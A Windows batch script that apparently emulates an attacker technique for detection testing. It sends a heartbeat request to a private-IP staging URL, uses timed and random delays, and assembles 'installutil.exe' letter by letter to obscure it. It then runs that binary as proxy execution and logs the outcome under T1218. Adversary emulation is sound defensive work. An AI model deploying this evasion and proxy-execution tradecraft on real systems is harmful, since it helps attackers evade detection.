@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET bcsztl=%APPDATA%\8553\d13693af
SET szctfa=https://10.0.0.49
SET xzjynb=https://10.0.0.49/stage/2/icon.png?8553-7
SET ntwhzv=ITZEL-S2BO
SET lmvpde=7
SET hgqwta=exploren.txt
SET jklxnm=8553
SET logfile=%APPDATA%\!lmvpde!\macula-simulations.log

echo [!DATE! !TIME!][DEBUG][!ntwhzv!]: script_start>> "!logfile!" 2>nul
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!ntwhzv!]: initial_delay_complete>> "!logfile!" 2>nul

curl -k -s -o nul "!xzjynb!"
echo [!DATE! !TIME!][DEBUG][!ntwhzv!]: heartbeat_sent=!xzjynb!>> "!logfile!" 2>nul

ping -n 6 127.0.0.1 >nul
SET /A rdelay=%RANDOM% %% 15 + 5
timeout /t !rdelay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!ntwhzv!]: random_delay=!rdelay!s>> "!logfile!" 2>nul

cd /d "!bcsztl!"
echo [!DATE! !TIME!][DEBUG][!ntwhzv!]: directory_changed=!bcsztl!>> "!logfile!" 2>nul

SET c1=i
SET c2=n
SET c3=s
SET c4=t
SET c5=a
SET c6=l
SET c7=l
SET c8=u
SET c9=t
SET c10=i
SET c11=l
SET c12=.
SET c13=e
SET c14=x
SET c15=e
SET lolbin=%c1%%c2%%c3%%c4%%c5%%c6%%c7%%c8%%c9%%c10%%c11%%c12%%c13%%c14%%c15%
SET a1=/logfile=
SET a2=/LogToConsole=false
SET a3=/U
SET args=%a1% %a2% %a3% !hgqwta!

CHOICE /C Y /N /D Y /T 8 >nul
echo [!DATE! !TIME!][DEBUG][!ntwhzv!]: executing=!lolbin! !args!>> "!logfile!" 2>nul
!lolbin! !args!

IF !ERRORLEVEL! EQU 0 (
    SET tresult=1
    SET terr=
) ELSE (
    SET tresult=0
    SET terr=install_failed_!ERRORLEVEL!
)
echo [!DATE! !TIME!][!ntwhzv!]: !lmvpde!-!jklxnm!-T1218|Signed Binary Proxy Execution=!tresult!:!terr!>> "!logfile!" 2>nul
echo [!DATE! !TIME!][DEBUG][!ntwhzv!]: ttp_complete_result=!tresult!>> "!logfile!" 2>nul
ENDLOCAL